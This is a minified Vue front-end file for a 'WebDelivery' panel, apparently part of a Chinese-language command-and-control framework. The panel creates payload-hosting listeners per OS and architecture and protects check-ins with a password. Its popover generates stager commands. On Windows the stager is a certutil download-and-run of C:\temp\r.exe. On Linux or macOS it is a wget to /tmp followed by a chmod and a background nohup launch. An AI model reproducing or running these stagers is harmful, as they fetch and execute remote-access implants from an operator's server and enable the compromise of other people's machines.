import{_ as q}from"./index-1317cb42.js";/* empty css                  *//* empty css                   *//* empty css                *//* empty css                     *//* empty css                 *//* empty css               *//* empty css                  *//* empty css                 *//* empty css                    */import{C as m}from"./index-d3335090.js";import{a as n,o as J,t as K,r as Q,D as R,u as X,w as Y,x as Z,y as ee,z as le,A as te,p as ae,v as oe}from"./element-61b2a7f7.js";import{H as se,r as V,_ as W,d as ne,l as r,m as v,V as l,P as a,T as d,U as re,O as _,S as C,p as k,F as S,a8 as D,az as ie,aA as de}from"./vue-95bbca75.js";const L=f=>(ie("data-v-c9c6bd13"),f=f(),de(),f),ue=L(()=>k("br",null,null,-1)),pe=L(()=>k("br",null,null,-1)),me={class:"form-container"},ce=se({__name:"WebDelivery",setup(f){const x=V([]),b=V(!1),E=V([]),$=async()=>{const s=await m.ShowListener();s.status===200?s.data.status===200?E.value=s.data.data:n.error(s.data.data):n.error("Something wrong")},z=[{label:"windows",value:"windows"},{label:"linux",value:"linux"},{label:"darwin",value:"darwin"}],O={windows:["amd64","386"],linux:["amd64","386","arm","arm64","loong64","mips","mipsle","mips64","mips64le"],darwin:["amd64","arm64"]},o=W({port:"",listener:"",os:"",arch:"",filename:"",pass:""}),w=W([]),U=s=>{o.arch="",w.splice(0,w.length,...O[s]||[])},c=async()=>{const s=await m.GetWebDeliveryList();s.status===200?s.data.status===200?x.value=s.data.data:n.error(s.data.data):n.error("Something wrong")},I=async()=>{const s=await m.StartWebDelivery({listener:o.listener,os:o.os,arch:o.arch,port:o.port,filename:o.filename,pass:o.pass});s.status===200?s.data.status===200?(n.success("添加成功"),await c()):n.error(s.data.data):n.error("Something wrong"),b.value=!1},A=async s=>{const t=await m.CloseWebDelivery({port:s.ListeningPort});t.status===200&&t.data.status===200&&(n.success("关闭成功"),await c())},F=async s=>{const t=await m.OpenWebDelivery({port:s.ListeningPort});t.status===200&&t.data.status===200&&(n.success("开启成功"),await c())},N=async s=>{const t=await m.DeleteWebDelivery({port:s.ListeningPort});t.status===200&&t.data.status===200&&(n.success("删除成功"),await c())};return ne(async()=>{await c()}),(s,t)=>{const u=J,i=K,B=Q,T=R,M=X,y=oe,g=Y,p=Z,h=ee,G=le,H=te,j=ae;return r(),v("div",null,[l(u,{type:"primary",size:"default",onClick:t[0]||(t[0]=e=>b.value=!0)},{default:a(()=>[d(" 新增 WebDelivery ")]),_:1}),ue,pe,l(M,{data:x.value},{default:a(()=>[l(i,{prop:"ListenerConfig",label:"Listener"}),l(i,{prop:"OS",label:"操作系统",width:"150"}),l(i,{prop:"Arch",label:"架构",width:"150"}),l(i,{prop:"Pass",label:"上线密码",width:"150"}),l(i,{prop:"ListeningPort",label:"监听端口",width:"150"}),l(i,{label:"状态",prop:"Status",width:"150"},{default:a(({row:e})=>[l(B,{type:e.Status===1?"success":"danger",size:"default"},{default:a(()=>[d(re(e.Status===1?"开启":"关闭"),1)]),_:2},1032,["type"])]),_:1}),l(i,{label:"操作"},{default:a(e=>[l(T,{placement:"top",width:500,trigger:"click",content:e.row.os==="windows"?`certutil -urlcache -split -f ${e.row.ServerAddress} C:\\temp\\r.exe && C:\\temp\\r.exe ${e.row.Pass}`:`wget -P /tmp ${e.row.ServerAddress}; chmod +x /tmp/${e.row.FileName}; nohup /tmp/${e.row.FileName} ${e.row.Pass} > m.log 2>&1 &`},{reference:a(()=>[e.row.Status===1?(r(),_(u,{key:0,size:"small",type:"success"},{default:a(()=>[d("上线命令")]),_:1})):C("",!0)]),_:2},1032,["content"]),e.row.Status===2?(r(),_(u,{key:0,size:"small",type:"success",onClick:P=>F(e.row)},{default:a(()=>[d("开启")]),_:2},1032,["onClick"])):C("",!0),e.row.Status===1?(r(),_(u,{key:1,size:"small",type:"primary",onClick:P=>A(e.row)},{default:a(()=>[d("关闭")]),_:2},1032,["onClick"])):C("",!0),l(u,{size:"small",type:"danger",onClick:P=>N(e.row)},{default:a(()=>[d("删除")]),_:2},1032,["onClick"])]),_:1})]),_:1},8,["data"]),l(j,{modelValue:b.value,"onUpdate:modelValue":t[7]||(t[7]=e=>b.value=e),title:"配置WebDelivery"},{default:a(()=>[l(H,{class:"box-card"},{default:a(()=>[k("div",me,[l(G,{model:o,"label-width":"120px"},{default:a(()=>[l(p,{label:"Listener"},{default:a(()=>[l(g,{modelValue:o.listener,"onUpdate:modelValue":t[1]||(t[1]=e=>o.listener=e),placeholder:"选择listener",onVisibleChange:$},{default:a(()=>[(r(!0),v(S,null,D(E.value,e=>(r(),_(y,{key:e,label:e,value:e},null,8,["label","value"]))),128))]),_:1},8,["modelValue"])]),_:1}),l(p,{label:"操作系统"},{default:a(()=>[l(g,{modelValue:o.os,"onUpdate:modelValue":t[2]||(t[2]=e=>o.os=e),placeholder:"选择操作系统",onChange:U},{default:a(()=>[(r(),v(S,null,D(z,e=>l(y,{key:e.value,label:e.label,value:e.value},null,8,["label","value"])),64))]),_:1},8,["modelValue"])]),_:1}),l(p,{label:"架构"},{default:a(()=>[l(g,{modelValue:o.arch,"onUpdate:modelValue":t[3]||(t[3]=e=>o.arch=e),placeholder:"选择架构",disabled:w.length===0},{default:a(()=>[(r(!0),v(S,null,D(w,e=>(r(),_(y,{key:e,label:e,value:e},null,8,["label","value"]))),128))]),_:1},8,["modelValue","disabled"])]),_:1}),l(p,{label:"上线密码"},{default:a(()=>[l(h,{modelValue:o.pass,"onUpdate:modelValue":t[4]||(t[4]=e=>o.pass=e),style:{width:"220px"},placeholder:"输入上线密码"},null,8,["modelValue"])]),_:1}),l(p,{label:"监听端口"},{default:a(()=>[l(h,{modelValue:o.port,"onUpdate:modelValue":t[5]||(t[5]=e=>o.port=e),style:{width:"200px"},placeholder:"输入监听端口"},null,8,["modelValue"])]),_:1}),l(p,{label:"文件名称"},{default:a(()=>[l(h,{modelValue:o.filename,"onUpdate:modelValue":t[6]||(t[6]=e=>o.filename=e),style:{width:"200px"},placeholder:"输入挂载的文件名称"},null,8,["modelValue"])]),_:1})]),_:1},8,["model"]),l(u,{type:"primary",onClick:I,disabled:!o.os||!o.arch},{default:a(()=>[d(" 确定 ")]),_:1},8,["disabled"])])]),_:1})]),_:1},8,["modelValue"])])}}});const xe=q(ce,[["__scopeId","data-v-c9c6bd13"]]);export{xe as default};
